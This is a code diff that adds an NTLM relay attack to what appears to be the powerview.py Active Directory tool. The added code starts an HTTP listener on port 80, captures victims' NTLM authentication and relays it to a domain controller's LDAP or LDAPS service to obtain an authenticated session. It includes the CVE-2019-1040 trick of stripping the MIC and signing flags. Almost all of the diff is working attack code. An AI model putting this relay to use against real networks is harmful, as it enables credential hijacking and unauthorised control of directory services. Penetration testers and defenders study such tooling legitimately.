@@ -3,7 +3,18 @@ from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb3structs import FILE_READ_DATA, FILE_WRITE_DATA
 from impacket.dcerpc.v5 import samr, epm, transport, rpcrt, rprn, srvs, wkst, scmr, drsuapi
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
-from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
+from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp 
+# for relay used
+from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
+from impacket.examples.ntlmrelayx.clients.ldaprelayclient import LDAPRelayClient,LDAPSRelayClient
+from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
+from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_UNICODE
+from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
+from ldap3.operation import bind
+from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
+from struct import unpack
+from time import sleep
 
 from powerview.utils.helpers import (
     get_machine_name,
@@ -39,6 +50,7 @@ class CONNECTION:
             self.use_kerberos = True
         self.no_pass = args.no_pass
         self.nameserver = args.nameserver
+        self.relay = args.relay
 
         if is_valid_fqdn(args.ldap_address) and self.nameserver:
             _ldap_address = host2ip(args.ldap_address, nameserver=self.nameserver, dns_timeout=5)
@@ -152,8 +164,26 @@ class CONNECTION:
 
         _anonymous = False
         if not self.domain and not self.username and (not self.password or not self.nthash or not self.lmhash):
-            logging.debug("No credentials supplied. Using ANONYMOUS access")
-            _anonymous = True
+            if self.relay:
+                host = "0.0.0.0"
+                port = 80
+                relay = Relay(self.ldap_address, host, port, self.args)
+                relay.start()
+
+                self.ldap_session = relay.get_ldap_session()
+                self.ldap_server = relay.get_ldap_server()
+                self.proto = relay.get_scheme()
+
+                # setting back to default
+                self.relay = False
+
+                return self.ldap_server, self.ldap_session
+            else:
+                logging.debug("No credentials supplied. Using ANONYMOUS access")
+                _anonymous = True
+        else:
+            if self.relay:
+                logging.warning("Credentials supplied with relay option. Ignoring relay flag...")
 
         if self.use_ldaps is True or self.use_gc_ldaps is True:
             try:
@@ -677,3 +707,254 @@ class CONNECTION:
             return self.create_rpc_connection(host=host, pipe=pipe)
         else:
             return self.rpc_conn
+
+class LDAPRelayServer(LDAPRelayClient):
+    def initConnection(self):
+        self.ldap_relay.scheme = "LDAP"
+        self.server = ldap3.Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
+        self.session = ldap3.Connection(self.server, user="a", password="b", authentication=ldap3.NTLM)
+        self.session.open(False)
+        return True
+
+    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            token = respToken2['ResponseToken']
+        else:
+            token = authenticateMessageBlob
+
+        authMessage = NTLMAuthChallengeResponse()
+        authMessage.fromString(token)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+            authMessage['MIC'] = b''
+            authMessage['MICLen'] = 0
+            authMessage['Version'] = b''
+            authMessage['VersionLen'] = 0
+            token = authMessage.getData()
+
+        with self.session.connection_lock:
+            self.authenticateMessageBlob = token
+            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
+            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
+            result = response[0]
+        self.session.sasl_in_progress = False
+
+        if result['result'] == RESULT_SUCCESS:
+            self.session.bound = True
+            self.session.refresh_server_info()
+            
+            self.ldap_relay.ldap_server = self.server
+            self.ldap_relay.ldap_session = self.session
+
+            return None, STATUS_SUCCESS
+        else:
+            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':
+                raise LDAPRelayClientException('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
+        return None, STATUS_ACCESS_DENIED
+
+class LDAPSRelayServer(LDAPSRelayClient):
+    def initConnection(self):
+        self.ldap_relay.scheme = "LDAPS"
+        self.server = ldap3.Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
+        self.session = ldap3.Connection(self.server, user="a", password="b", authentication=ldap3.NTLM)
+        self.session.open(False)
+        return True
+
+class HTTPRelayServer(HTTPRelayServer):
+    class HTTPHandler(HTTPRelayServer.HTTPHandler):
+        def do_relay(self, messageType, token, proxy, content = None):
+            if messageType == 1:
+                if self.server.config.disableMulti:
+                    self.target = self.server.config.target.getTarget(multiRelay=False)
+                    if self.target is None:
+                        logging.info("HTTPD(%s): Connection from %s controlled, but there are no more targets left!" % (
+                            self.server.server_address[1], self.client_address[0]))
+                        self.send_not_found()
+                        return
+
+                    logging.info("HTTPD(%s): Connection from %s controlled, attacking target %s://%s" % (
+                        self.server.server_address[1], self.client_address[0], self.target.scheme, self.target.netloc))
+
+                if not self.do_ntlm_negotiate(token, proxy=proxy):
+                    # Connection failed
+                    if self.server.config.disableMulti:
+                        logging.error('HTTPD(%s): Negotiating NTLM with %s://%s failed' % (self.server.server_address[1],
+                                  self.target.scheme, self.target.netloc))
+                        self.server.config.target.logTarget(self.target)
+                        self.send_not_found()
+                        return
+                    else:
+                        logging.error('HTTPD(%s): Negotiating NTLM with %s://%s failed. Skipping to next target' % (
+                            self.server.server_address[1], self.target.scheme, self.target.netloc))
+
+                        self.server.config.target.logTarget(self.target)
+                        self.target = self.server.config.target.getTarget(identity=self.authUser)
+
+                        if self.target is None:
+                            logging.info( "HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" %
+                                (self.server.server_address[1], self.authUser, self.client_address[0]))
+                            self.send_not_found()
+                            return
+
+                        logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
+                            self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+
+                        self.do_REDIRECT()
+
+            elif messageType == 3:
+                authenticateMessage = NTLMAuthChallengeResponse()
+                authenticateMessage.fromString(token)
+
+                if self.server.config.disableMulti:
+                    if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_UNICODE:
+                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                                    authenticateMessage['user_name'].decode('utf-16le'))).upper()
+                    else:
+                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
+                                                    authenticateMessage['user_name'].decode('ascii'))).upper()
+
+                    target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
+
+                if not self.do_ntlm_auth(token, authenticateMessage):
+                    LOG.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc,
+                                                                               self.authUser))
+                    if self.server.config.disableMulti:
+                        self.send_not_found()
+                        return
+                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
+                    # which we don't want
+                    if authenticateMessage['user_name'] != '':  # and authenticateMessage['user_name'][-1] != '$':
+                        self.server.config.target.logTarget(self.target)
+                        # No anonymous login, go to next host and avoid triggering a popup
+                        self.target = self.server.config.target.getTarget(identity=self.authUser)
+                        if self.target is None:
+                            LOG.info("HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" %
+                                (self.server.server_address[1], self.authUser, self.client_address[0]))
+                            self.send_not_found()
+                            return
+
+                        LOG.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
+                            self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+
+                        self.do_REDIRECT()
+                    else:
+                        # If it was an anonymous login, send 401
+                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
+                else:
+                    # Relay worked, do whatever we want here...
+                    logging.info("HTTPD(%s): Authenticating against %s://%s as %s SUCCEED" % (self.server.server_address[1],
+                        self.target.scheme, self.target.netloc, self.authUser))
+
+                    if self.server.config.disableMulti:
+                        # We won't use the redirect trick, closing connection...
+                        if self.command == "PROPFIND":
+                            self.send_multi_status(content)
+                        else:
+                            self.send_not_found()
+                        return
+                    else:
+                        # Let's grab our next target
+                        self.target = self.server.config.target.getTarget(identity=self.authUser)
+
+                        if self.target is None:
+                            LOG.info("HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" % (
+                                self.server.server_address[1], self.authUser, self.client_address[0]))
+
+                            # Return Multi-Status status code to WebDAV servers
+                            if self.command == "PROPFIND":
+                                self.send_multi_status(content)
+                                return
+
+                            # Serve image and return 200 if --serve-image option has been set by user
+                            if (self.server.config.serve_image):
+                                self.serve_image()
+                                return
+
+                            # And answer 404 not found
+                            self.send_not_found()
+                            return
+
+                        # We have the next target, let's keep relaying...
+                        LOG.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
+                            self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+                        self.do_REDIRECT()
+
+class Relay:
+    def __init__(self, target, interface="0.0.0.0", port=80, args=None):
+        self.target = "ldap://%s" % (target)
+        self.interface = interface
+        self.port = port
+        self.args = args
+        self.ldap_session = None
+        self.ldap_server = None
+        self.scheme = None
+
+        target = TargetsProcessor(
+                    singleTarget=self.target, protocolClients={
+                            "LDAP": self.get_relay_ldap_server,
+                            "LDAPS": self.get_relay_ldaps_server,
+                        }
+                )
+
+        config = NTLMRelayxConfig()
+        config.setTargets(target)
+        config.setInterfaceIp(interface)
+        config.setListeningPort(port)
+        config.setProtocolClients(
+            {
+                "LDAP": self.get_relay_ldap_server,
+                "LDAPS": self.get_relay_ldaps_server,
+            }
+        )
+        config.setMode("RELAY")
+        config.setDisableMulti(True)
+        self.server = HTTPRelayServer(config)
+
+    def get_scheme(self):
+        return self.scheme
+
+    def get_ldap_session(self):
+        return self.ldap_session
+
+    def get_ldap_server(self):
+        return self.ldap_server
+
+    def start(self):
+        self.server.start()
+
+        try:
+            while True:
+                if self.ldap_session is not None:
+                    logging.debug("Success! Relayed to the LDAP server. Closing HTTP Server")
+                    self.server.server.server_close()
+                    break
+                sleep(0.1)
+        except KeyboardInterrupt:
+            print("")
+            self.shutdown()
+        except Exception as e:
+            logging.error("Got error: %s" % e)
+            sys.exit()
+
+    def get_relay_ldap_server(self, *args, **kwargs) -> LDAPRelayClient:
+        relay_server = LDAPRelayServer(*args, **kwargs)
+        relay_server.ldap_relay = self
+        return relay_server
+
+    def get_relay_ldaps_server(self, *args, **kwargs) -> LDAPSRelayClient:
+        relay_server = LDAPSRelayServer(*args, **kwargs)
+        relay_server.ldap_relay = self
+        return relay_server
+
+    def shutdown(self):
+        logging.info("Exiting...")
+        sys.exit(0)
